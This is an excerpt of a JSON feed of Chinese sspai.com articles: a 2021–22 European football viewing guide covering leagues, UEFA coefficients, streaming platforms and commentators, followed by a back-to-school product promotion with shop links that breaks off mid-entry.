新赛季欧洲足球联赛观看指南</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68662"},{"title":"2021–2022 赛季欧洲足球联赛观看指南","date":"2021-09-08 09:29:15","description":"\n<p>注：封面图来自 The Ringer</p>\n<h2>火热的新赛季，从热闹的转会开始</h2>\n<p>踩着 8 月份的尾巴，欧洲足球联赛纷纷拉开了新赛季的序幕。8 月 27 日，欧冠联赛小组赛阶段抽签尘埃落定；9 月 1 日，五大联赛转会窗口的关闭，热闹了一个夏天的转会市场，终于暂时的安静了下来。受新冠疫情影响空场了半年多的体育场，终于迎回了受限制人数的球迷的主场观战。</p>\n<p>新赛季的足球比赛还没开始，转会窗口的各种疯狂操作就已经成为了让球迷们热议的谈资。谁都没能想到，在疫情还在持续影响经济的 2021 年，足坛「绝代双骄」居然可以在同一个转会期更换东家，「离家」和「回家」也成了这个夏天的主旋律。</p>\n<p>2000 年，年仅 13 岁的梅西（Lionel Messi）来到巴塞罗那，在一张餐巾纸上签下了第一份足球合约。21 年后，巴塞罗那俱乐部因为经济原因无法与梅西完成续约，梅西在合同到期后，不得不泪洒发布会，宣布告别巴塞罗那队。随后，巴黎圣日耳曼俱乐部宣布了梅西加盟的消息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/f3bd7f972e3fc6ab26e3456e624a764e.jpg\"><figcaption>梅西加盟 PSG，图片来自法甲联赛</figcaption></figure><p>2003 年，意气风发的小小罗（Cristiano Ronaldo）登陆老特拉福德，接过了代表着传奇的 7 号球衣。在皇马和尤文兜兜转转了 12 年之后，如今已贵为「总裁」的 C 罗重新回到曼联，回到梦开始的地方。时过境迁，已经 36 岁的 C 罗重新披上了红魔 7 号战袍，却不知归来是否仍少年？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/16d2f0b0d4af38dbd8f45f50c712b48a.jpg\"><figcaption>C 罗重披红魔 7 号，图片来自 TNT Sports</figcaption></figure><p>在足坛两大巨星引发的地震般的动荡中，新赛季的欧洲足球联赛开始了。</p>\n<h2>看球之前，先来聊聊关于足球联赛的小知识</h2>\n<p>看到上面这段略带唏嘘的引子，新球迷们可能对于其中的足坛黑话还不甚明白，觉得云里雾里。在正式介绍新赛季观球方案之前，我们还是先来谈谈关于欧洲足球联赛的小知识。</p>\n<h3>足球联赛是什么？和世界杯有何不同？</h3>\n<p>不同于世界杯或洲际杯（比如欧洲杯、美洲杯、亚洲杯等）等 N 年一届的赛会制比赛，各国的足球联赛基本都由本国足球协会筹办，每年都会举行。参与联赛的队伍也不是国家队，而是由职业足球运动员组成的俱乐部队，球迷们常说的皇马、曼联、巴萨、拜仁等都是足球俱乐部。</p>\n<p>欧洲联赛的开赛时间通常为当年的 8 月到次年的 5 月，即一个完整的「赛季」，本文所指的「新赛季」观赛指南，指的就是 2021–2022 赛季。由于欧洲足球联赛的整体水平高，且汇集了全世界最好的球员、教练及足球从业者，因此，观看欧洲各国的足球联赛就成了球迷们「看球」的默认语境。</p>\n<p>在欧洲足球联赛中，又以广大中国球迷熟悉的「五大联赛」最为知名。「五大联赛」指的是欧洲五个国家的顶级足球联赛，分别是英国的英格兰足球超级联赛（English Premier League）、西班牙足球甲级联赛（España La Liga）、德国足球甲级联赛（Bundesliga）、意大利足球甲级联赛（Italia Lega Serie A）和法国足球甲级联赛（France Ligue 1）。</p>\n<p>不过，今年的情况有些特别，根据最新的欧足联系数，葡萄牙超过了法国，雄踞第五，葡萄牙超级联赛（Portugal Primeira Liga）也因此将法甲挤出了五大联赛的行列——世界巨星梅西在泪别母队之后，居然加盟了一支非五大联赛的球队（笑）。</p>\n<p>所谓 <a href=\"https://www.uefa.com/memberassociations/uefarankings/country/#/yr/2022\" target=\"_blank\">欧足联系数</a>，是欧洲足球联合会联盟（UEFA）每年都会发布的数据排名。其中，欧足联会统计过去五年各国俱乐部在欧洲赛事的成绩并折算成分数，进而得出当年的国家联赛名次。这个名次不仅决定了「谁是『五大联赛』」这么简单，它还直接关系到每个国家有几支俱乐部可以参与欧冠联赛等赛事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/56e7c310fe2666377212463a177e23b8.png\"><figcaption>今年的欧足联「男子国家系数」排名，葡萄牙力压法国，晋升「五大联赛」之列</figcaption></figure><p>各国的足球联赛都采用主客场积分制，即所有参赛球队要两两对战，并各自到对方的球场踢球（即所谓的「主客场」）。每场比赛都不设加时赛和点球大战，获胜的队伍获得 3 分，打平了话双方各加 1 分，输了的球队则没有积分入账（0 分）。赛季结束后，积分最高的队伍将获得联赛冠军，如果有积分相同的，则根据各国联赛的规则，比较同分队伍的胜负关系等数据决定冠军的归属。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/bd49f4961a00cd7136858e879acf2e29.png\"><figcaption>每个联赛都会有一个积分榜（Tables），在全部完成两两对决后，积分榜上得分最高的球队就是当季冠军</figcaption></figure><h3>除了足球联赛，还有欧冠和欧联</h3>\n<p>在各国举办足球联赛的同期，欧足联还会组织各国俱乐部共同参加欧洲冠军联赛（简称「欧冠」）和欧足联欧洲联赛（简称「欧联」）。由于欧冠和欧联汇集了来自欧洲各国最强的俱乐部，所以比赛的精彩和激烈程度很高，能够赢得欧冠奖杯也被视为足球俱乐部的最高荣誉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/9f33962ae5732efceea10a1564041719.png\"><figcaption>各国联赛与欧冠、欧联的关系：最好的球队去欧冠，其次好的去欧联。图片仅为示意，各国实际参与欧冠及欧联的俱乐部数量视当年欧足联系数排名而定</figcaption></figure><p>和联赛的赛制略有不同，欧冠和欧联的比赛会分为「小组赛」和「淘汰赛」两个阶段，所有参加比赛的球队会被分成小组，小组赛阶段采用积分制，每个小组最高的前两名出线，重新抽签后进入淘汰赛阶段。淘汰赛阶段的每一场较量都是一主一客的两场比赛，以进球决定胜负（如果进球数相同，则对比客场进球数）。</p>\n<p>进入决赛后，两支队伍将会在一个中立场地一场定胜负，赢球的队伍就能捧得奖杯。</p>\n<h2>去哪儿能看到比赛</h2>\n<h3>看球平台</h3>\n<p>如果想快速的找到收看各大欧洲联赛的平台，收藏和参考以下这张表格即可（末尾有中超乱入）。</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>联赛</th>\n<th>收看平台</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>英超</td>\n<td>咪咕视频、爱奇艺体育</td>\n</tr>\n<tr>\n<td>西甲</td>\n<td>咪咕视频、爱奇艺体育</td>\n</tr>\n<tr>\n<td>德甲</td>\n<td>咪咕视频、腾讯体育、虎牙直播、懂球帝</td>\n</tr>\n<tr>\n<td>法甲</td>\n<td>咪咕视频</td>\n</tr>\n<tr>\n<td>意甲</td>\n<td>咪咕视频</td>\n</tr>\n<tr>\n<td>葡超</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>苏超（苏格兰超级联赛）</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>土超（土耳其超级联赛）</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>荷甲（荷兰足球甲级联赛）</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>欧冠</td>\n<td>咪咕视频、腾讯体育、爱奇艺体育、PP 体育</td>\n</tr>\n<tr>\n<td>欧联</td>\n<td>咪咕视频、腾讯体育、爱奇艺体育、PP 体育</td>\n</tr>\n<tr>\n<td>中超</td>\n<td>咪咕视频、腾讯体育、懂球帝</td>\n</tr>\n</tbody>\n</table></figure><p>以上列举了知名欧洲联赛在中国大陆的收看方式，如果各联赛中有你关注的球队和球星，只需要根据表格内容到对应平台查询直播安排即可。</p>\n<h3>会员和增值服务</h3>\n<p>当然，熟悉体育赛事直播的朋友都知道，各平台转播足球联赛需要缴纳转播费，而球迷看球也要支付相应的费用。但对于不同平台和不同联赛，付费的方案也各不相同。</p>\n<h4>咪咕视频：支持按场次观看</h4>\n<p>新赛季咪咕视频一骑绝尘，拿下了五大联赛的所有转播权，而且咪咕视频开辟了新的付费玩法——通看券。通看券可以用来兑换单场赛事直播，也可以用来兑换其它热播影视和剧集，或者 UCL 等其它体育直播场次，价格为 15 元包月（内含 10 张通看券）和 30 元包月（内含 30 张通看券）两种。除了按月付费之外，咪咕的通用券包还提供按季度付费和按次加油包。对于没时间看完赛季全程，只想看重大比赛的球迷来说，这种收费方式非常友好。</p>\n<p>不过，想要享受到 1080p 的画质，则需要先开通咪咕视频的钻石会员，其收费如下图所示:</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/04/daf761712b8d28236f5ab1428cdaa7aa.jpg\"><figcaption>咪咕视频钻石会员收费</figcaption></figure><h4>爱奇艺：经典的「包赛季」模式</h4>\n<p>爱奇艺体育的付费方式仍是经典的「包赛季」模式——支付一定的费用后即可观看某个联赛的全部直播场次，目前已经推出了 238 元的「英超全季通」和「西甲全季通」。开通全季通服务后，球迷可享受 1080p 50 帧的高清直播。如果想要更划算地观看所有爱奇艺赛事，还可以考虑购买 318 元的足球年卡，包含英超、西甲、欧冠、亚冠、世亚预 12 强赛等比赛。</p>\n<h4>腾讯体育：熟悉的「QQ 会员」模式</h4>\n<p>腾讯体育的收费策略分为体育 VIP 和体育超级 VIP 两档会员，目前连续包月价格分别为 25 每月和 60 元每月。二者在内容上的区别主要在于是否包含 F1、NHL 等其它赛事直播，以及观看直播赛事时是否扣除每个月数量有限的观赛券等。</p>\n<p>腾讯体育的核心竞争力在于 NBA 直播，此外，部分较为冷门的欧洲足球联赛——如苏超、土超、荷甲等——均在腾讯体育可以收看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/04/b327c2a9a87650c6d64f37a04e4b96f5.jpg\"><figcaption>左👈图为爱奇艺，右👉图为腾讯体育</figcaption></figure><p>而对于德甲的球迷来说，由于虎牙直播和懂球帝则都提供免费的赛事直播，所以专门为它购买腾讯体育 VIP 并不划算。另外，腾讯平台还会免费播放 21–22 赛季欧冠和欧联的全场次比赛。</p>\n<h3>不同平台，不同解说</h3>\n<p>在价格和平台之外，部分球迷还有自己独特中意的解说风格，下表就总结了各平台签约的主要足球解说员，他们的声音会在接下来的一个赛季中与你相伴：</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>视频平台</strong></td>\n<td><strong>解说嘉宾</strong></td>\n</tr>\n<tr>\n<td>咪咕视频</td>\n<td>詹俊、张路、黄健翔、娄一晨、刘越、李欣、梁祥宇、刘焕、贺宇、徐阳、苗锟等</td>\n</tr>\n<tr>\n<td>爱奇艺</td>\n<td>苏东、金相凯、刘晶捷、于鑫淼等</td>\n</tr>\n<tr>\n<td>腾讯体育</td>\n<td>颜强、徐亮、杨晨等</td>\n</tr>\n</tbody></table></figure><h2>比赛以外，狂欢继续</h2>\n<p>当你入坑成了一名地道的足球迷，光看比赛直播肯定不够过瘾。看完自己心爱的球队的比赛，不管场面荡气回肠还是平淡无奇，都会想着找人聊聊。虽然你周围或许没有同好的小伙伴，单互联网给我们提供了交流的平台。</p>\n<p>国内目前人气最高的足球社区是懂球帝和虎扑，而懂球帝完全专注于足球领域。球迷可以关注自己感兴趣的球队、联赛和球星，像刷抖音一样刷一刷他们的最新消息。此外，OneFootball 也是一款不错的足球动态追踪工具，订阅主队之后，比赛开始以及比赛中重要的赛况（进球、红黄牌等）会实时推送。</p>\n<ul><li>关联阅读：《<a href=\"https://sspai.com/post/63948\" target=\"_blank\">没时间看比赛直播？你可以用这些方式追踪球队和球星动态</a>》</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/04/df4cb39cb94ea925990d2b4e122059c5.jpg\"></figure><h2>最后</h2>\n<p>热爱足球的方式有很多种，在文章的最后，我还想给各位一个大胆的建议：买一双足球鞋，走上球场吧。自己去踢球，不仅能锻炼身体，还会认识很多很多的朋友。</p>\n<p>祝你看球开心，踢球开心。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/68613"},{"title":"开学季到来，为你推荐这 10+ 款数码 / 生活实用好物","date":"2021-09-08 09:00:57","description":"\n<p>新学期新气象！本獭知道我派有不少作者 / 读者朋友都是学生朋友，因此在这个还不算晚的开学季搜罗了一些适合校园的商品，希望它们可以提高你的生活质量，同时陪伴着你高效学习。当然，已经毕业的大朋友有需要的也可以快乐选购。</p>\n<p><strong>活动时间：</strong>9.9 ~ 9.11（促销价格 9 月 9 日 00:00 开始生效，可以提前加入购物车）</p>\n<p><strong>活动优惠：</strong>淘宝跨店每满 ￥200 减 ￥20，部分商品不参与满减</p>\n<p><a href=\"https://shop549593764.taobao.com/index.htm?spm=2013.1.w5002-18497266160.2.2fa346beBU2yc8\" target=\"_blank\">进店看看 &gt;</a></p>\n<h2>📱 数码配件</h2>\n<h3>少数派一派胡言鼠标垫</h3>\n<p>￥69 <s>原价￥79</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654440692177\" target=\"_blank\">点这买 &gt;</a>（预售产品）</p>\n<p>少数派鼠标垫又上新了，这次我们为你带来了全新的「一派胡言」鼠标垫，我们收集了围绕少数派网站本身以及社群的各种梗，经过内部筛选汇总了你所看到的这些，如果你经常看少数派的话，许多语句都应该不陌生了。总之是一款看起来有点「喧嚣」的垫子，比较适合注重趣味性的朋友。</p>\n<p>尺寸为 800mm*300mm，采用了天然橡胶的材质和发泡工艺，背面使用了八字防滑纹路，让鼠标垫有很强的附着力，紧密贴合桌面，防滑且稳固。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/30e41be6dbb312d69d6cc76b0eb8b24e.png\"></figure><h3>少数派 × 几硕充电套装</h3>\n<ul>\n<li>单头：￥69 <s>原价￥79</s>\n</li>\n<li>套装：￥129 <s>原价￥139</s>\n</li>\n</ul>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=629599437406\" target=\"_blank\">点这买 &gt;</a></p>\n<p>推出了将近一年，这款充电头已经成为了我派商店的销量常青树。而 20W PD 充电器的行列中，它也还依旧称得上是小巧玲珑。更友好一点的折叠插脚设计节省空间，比苹果原装的 18W 充电头还小，充电功率却达到了 20W，可以为你的手机、平板或其他数码设备提供更快的充电速度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/19/cbfdcf210b315b4d64bf7f2789b2d9cc.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>征拓 Zendure SuperMini 移动电源</h3>\n<p>￥168 <s>原价￥198</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?spm=a1z10.3-c-s.w4002-22968806714.12.2b6961f0UL0Iky&amp;id=624918843222\" target=\"_blank\">点这买 &gt;</a></p>\n<p>10000 毫安的容量日常使用刚好，仅一包纸巾大小的身板、丰富的接口类型加上 PD 和 QC 齐全的通用快充协议，华为、Apple 设备都可以快充，再小的包包里似乎都能给它找到一席之地，带上出门也能多一分安心。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/62283\" target=\"_blank\">一包纸巾大小的移动电源：Zendure SuperMini</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/2ac56b593bc1d5ebe4f3ada8d59157f7.jpg\"></figure><h3>极匠系列无线充鼠标垫</h3>\n<p>￥149 <s>原价￥169</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2xk2z6vfcutm8iz\" target=\"_blank\">点这买 &gt;</a></p>\n<p><a href=\"https://sspai.com/u/sober/posts\" target=\"_blank\">@SoberStudio</a>：在我的充电习惯里，无线充电是不可或缺的一部分：只要坐在办公桌前，我就会把手机放到无线充电座上给它「补补血」，想用了就拿起来用，永远不怕手机没电。极匠的这款无线充电鼠标垫是很符合我的充电习惯的一款产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/e5825838f78da5f19aa7692ccc6e4d58\"></figure><p>鼠标垫的接触面采用的是仿皮革的PU 材质，摸起来很细腻很舒服。和桌面接触的一面用的是防滑的材质，在木质桌面和玻璃面上都可以固定的很牢，不容易滑走。整体的厚度在六毫米左右，作为常规的鼠标垫使用，手腕部分也不会悬空。</p>\n<p>这款鼠标垫的无线充电区域位于鼠标垫的左侧偏下的位置，支持最高 15W 的 Qi 无线充电标准。我自己实测下来，给 iPhone 充电可以稳定在 6-7 W 上下，日常补电算是够用啦。在成功激活无线充电后，鼠标垫前侧会有一个小小的绿灯亮起，提醒你已经充上了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/e94d07b18dca7a66264970be34dedaff\"></figure><p>因为鼠标垫的无线充电范围是有限的，这款产品还很贴心的附赠了一个红色的定位贴，方便放手机时快速定位到最佳的充电位置。如果你恰巧财力雄厚，会经常换手机，这个定位贴也是支持撕下来洗干净重新贴的。</p>\n<p>而对于 iPhone 12 系列，它提供了磁吸辅助定位，鼠标垫里有一圈磁铁。磁力相比 magsafe 充电器稍弱一些，但是用于辅助定位也完全够用，其他手机系列可以用定位贴。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/e3ff08f228e005fcea49de8ee53fba9e\"></figure><p>我个人对这款产品还是十分满意的：坐在办公桌前随手把手机一放就能充上电了，这种感觉真的太好了。唯想吐槽的点是包装盒做的不够用心，塑料底座有一丢丢的廉价，不过不影响产品的使用啦。</p>\n<h3>iQunix 支架系列</h3>\n<p>￥45 起 <s>原价 ￥49 起</s></p>\n<p>🛒<a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=iQunix&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买 &gt;</a></p>\n<p>对于空间有限的宿舍桌面，一款靠谱的支架是必不可少的了。除了简洁的设计和质感很好的铝材质，我还非常喜欢 iQunix 显示器支架的底部镂空，帮我把显示器外接线、笔记本充电线、屏幕挂灯连接线、线线线……各种线都藏了起来，还帮我收纳了之前散落在桌子上的小东西，一下子让桌子整洁了不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/19/8a13114148ff524ac75c2bc351be5690.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><p>当然，如果你使用的是笔记本，iQunix L / E 系列也能够在抬升高度的同时为你提供合适的角度打字。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/19/0f8f3558e88c014122b8b80faca7766f.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><h2>🏡 生活日用</h2>\n<h3>杜邦吸湿盒</h3>\n<p>3 盒 ￥29.9 <s>原价￥39.9</s>，6 盒 ￥49.9 <s>原价￥79.8</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3np7jbau0ft7kmw\" target=\"_blank\">点这买 &gt;</a></p>\n<p>长假过去之后返校打开衣柜，发现衣物发霉是每一个在南方上大学孩子的痛，因此一个靠谱的除湿干燥盒是必不可少的，来自杜邦的这款产品采用了高品质氯化钙，官方宣传吸水率达到 600%。除了无香外，还有两种其他香型可选，不仅是衣柜，卧室、书房、客厅等任意有需要的角落都可以持续除湿，每盒有效面积 4-5 ㎡ 左右。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/6dfa5265ea4eea865bb1e6cfd12f7a3f.png\"></figure><h3>bgest 真空收纳袋</h3>\n<p>￥199（包含：电动抽气泵 *1、大 / 中 / 小真空收纳袋分别 4 个）</p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=627637984320\" target=\"_blank\">点这买 &gt;</a></p>\n<p>不管对于宿舍还是家中，换季衣物的收纳是永远的需求，特别是北方既有厚棉被又有冬季衣物的情况下，就常常感叹家中的空间还是太小了。来自 bgest 的真空压缩袋套装利用真空压缩，节省了 80% 的置物空间，而无线的抽真空泵用起来更加便携，三种阀口可以应对不同的需求，双向都有口，实现了能抽也能吸，很适合游泳圈这类的产品，2200mAh 的电池容量，当然，接口是 Type-C 的。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/65462\" target=\"_blank\">新玩意 055 - bgest 真空压缩袋套装</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/bf8ee6825739078333ab64aae16ff3b5\"></figure><h3>解决鞋子异味：EraClean 除鞋臭喷雾 / 小仓熊除臭球</h3>\n<p>除臭喷雾￥19.9 一瓶，￥39.8 三瓶 <s>原价 ￥29.9 一瓶</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/3ewloe9lk245s\" target=\"_blank\">点这买 &gt;</a></p>\n<p>除臭球￥24.9 <s>原价￥56</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654881393903\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@问路：随着天气的变热，我逐渐也开始关注自己的「鞋内健康」，避免夏季多汗潮湿的鞋内环境因此滋生大量细菌真菌，产生异味是一方面，另一方面也担心脚部健康问题，于是就试了试 EraClean 的除臭喷雾。喷雾主要是用来满足「除味」「杀菌」两大需求，速干成分喷完后几秒就能上脚穿上，无需长时间晾干或者等待。另外这小小一瓶居然能喷 640 次，一瓶应付一年应该没有问题。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/66884\" target=\"_blank\">新玩意 064 - EraClean 除鞋臭喷雾</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/27/bee4481b727aa814c9ecc3f2496f5c87.gif\"></figure><p>当然，如果你想要更加长效的产品，则可以试试小仓熊的除臭球，一颗可以管用 45 天，天然桉树精油杀菌去异味，鞋子不穿时丢到里面即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/ce7b96d594a85182de7dec34b98c6d1e.png\"></figure><h3>Eraclean 洗手间除味杀菌机</h3>\n<p>￥299 <s>原价￥399</s></p>\n<p>🛒<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/27bb412bv17z47l?step=2\" target=\"_blank\">点这买 &gt;</a></p>\n<p>厕所异味难搞定？除了使用各种芳香产品掩盖之外，不如试试 Eraclean 的这款壁挂式产品，采用了活性氧杀菌，解决了传统香薰只能掩盖或者吸附异味的缺点。先杀菌之后再进行喷香，采用了固体香氛片，两种香型可选。另外针对不同卫生间的布局情况，供电方式可选墙插 / 充电，固定方式可选黏贴 / 打孔，随心使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/2b00052417ae7a6995f42d70851ff048.png\"></figure><h3><strong>几素摇头伸缩桌面落地两用风扇</strong></h3>\n<ul>\n<li>桌面版：￥129 <s>原价 ￥159</s>\n</li>\n<li>伸缩 / 桌面两用：￥159 <s>原价 ￥199</s>\n</li>\n</ul>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=619824008848\" target=\"_blank\">点这买 &gt;</a></p>\n<p>相比单纯的桌面款风扇，几素这款加入了可伸缩杆的设计，在不同的场景下还可以作为落地扇来使用，不管是床头还是桌前，都能为你送来清凉。除了传统的 4 档风力，第 5 档为大小不一的自然风模式，让体感更为舒适。</p>\n<p>加入了方便日常充能的 USB Type-C，4 节 18650 电池，官方数据测试可以提供 24 小时的无线使用时间。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/60896\" target=\"_blank\">这款可摇头可伸缩的小风扇，可能是你的今夏必备</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/06/15/785a31a4aefc43734919d00379a64613.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><h3>意外设计钢笔</h3>\n<ul>\n<li>意外设计钢笔：￥295.2 <s>原价 ￥328</s>\n</li>\n<li>意外设计钢笔+少数派八周年日记本套装：￥335 <s>原价￥417</s>\n</li>\n</ul>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=652277527563\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@北鸮：便携钢笔合盖后长度很短，和一支唇膏差不多，笔尾螺纹可以旋入笔帽，在书写时加长笔身。红花梨木的颜色在我看来非常讨喜。意外设计为了表现「时光」这个主题，在这款便携钢笔身上采用了黄铜和实木作为原料。这两种材料的特性就是他们都会随着使用缓慢氧化、变色，留下时光的痕迹，最终每支钢笔的外观都会不同。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/article/3b5009998548dbb5afa731896a4a87b9\"></figure><p>至于功能性方面，意外设计采用了最稳妥的方案：采用施密特的镀金钢尖总成，直接适配欧标墨囊。施密特笔尖总成的素质是不错的，意外选择的这个型号弹性适中，比较顺滑，其实非常符合「便携钢笔」的定位。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/68006\" target=\"_blank\">新玩意 072 - 意外设计小时光便携钢笔・花信礼盒套装</a></p>\n<h3>地平线八号行李箱系列</h3>\n<ul>\n<li>\n<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/1y582ayg7k7f4?step=1\" target=\"_blank\">20 寸：</a>￥289（冰川粉 / 曜石黑 / 深海蓝）</li>\n<li>\n<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/2x5auh5w7nmr4q9?step=1\" target=\"_blank\">24 寸：</a>￥439 <s>原价￥499</s> （冰川粉 / 极光绿 / 芥末绿）</li>\n</ul>\n<p><strong>@waychane 在用：20 寸周游记限定系列</strong></p>\n<p>由于经常出差，我对行李箱的需求首先是能够登机，减少落地之后提取行李的等候时间；其次是好推，拉杆的稳定性、滑轮顺滑性以及静音型，都是需要考量的方面；「好看」是最后也是非常重要的一点，行李箱在身边也算半件「服饰」，谁也不想拖着图案奇怪、质感「低劣」的箱子在身边。</p>\n<p>过去几年，我一直在用「地平线 8 号」推出的行李箱产品，好推好拉、设计也足够简洁，满足了上述全部需求，价格也相对合理；当然，近期收到的这款「周游系列行李箱」也不例外。这款行李箱的尺寸为 20 英寸，能够轻松带上飞机，3 日以内的差旅出行使用也绰绰有余。拉杆和滑轮作为「地平线」产品的强项，自然也不用多说，拖行顺畅、提拉轻松；我的老款行李箱经过几年使用之后，拉杆和滑轮的状态依然非常稳定，耐用性也不必再提。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/422a923b686178804a4807807f0a6d0e.jpg\"></figure><p>相比之下，「周游系列」的箱体设计整体更为圆润，观感于我而言更为舒适；这款行李箱还采用了被称为「不等分设计」的造型，侧面拉链部分具有弧线设计，算是设计中的一处小细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/e3c714d5ea2e3879377ea38f7cc13d95.jpg\"></figure><p>这款行李箱还贴心地提供了一个收纳包，收纳包尺略小于 12.9 英寸 iPad Pro，非常「能装」，透明且防泼水的面料进一步增加了这款「配件」的实用性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/e548669b4b0f52eece91c7d359db695c.jpg\"></figure><p><strong>@吃派的水獭 在用：24 英寸托运箱</strong></p>\n<p>我一直是地平线箱子的忠实用户，最初大概是因为锤子的原因，让我对这个品牌印象不错。</p>\n<p>之前一直在用 20 寸登机箱，作为首发用户一直用了三年多，质量非常靠谱。这次同事寄来了 24 寸的版本让我体验，直观的感受就是大了许多，像是「Pro Max」版本，外表还是熟悉的颗粒 PC 表面，虽说对贴纸不太友好，但好处是真的很耐磨扛脏。该系列的静音万向轮真的体验绝佳，顺滑、静谧，像是装了什么减震装置。我收到的这款「芥末绿」版本复古清爽，再适合夏天不过了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/904136d90d92c999ac368bddd96b5411.jpg\"><figcaption>左：20 寸，右：24 寸</figcaption></figure><p>作为一个箱子本身的功能性其实没什么好说的，卡扣固定、拉链分区该有的都有，挑一个比较实用的说说：在拉杆的下方贴着一个小程序码，可以扫码注册会员绑定商品信息，方便日后保修。而对于陌生人来说，这则是一个电子行李挂牌，扫码就可以查看你填写的个人信息，方便拾取捡到后与你进行联系，解决了实体行李牌公开展示个人信息的隐私问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/a150ca194ea873ccf3a21bf4278ee64e.jpg\"></figure><p>非要说有什么遗憾，那可能就是初版背面的印着的「Designed by Smartisan」现在已经消失了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/175e18db77df557db072a33ef717277f.JPG\"></figure><h3>tomtoc 背包系列</h3>\n<ul>\n<li>\n<a 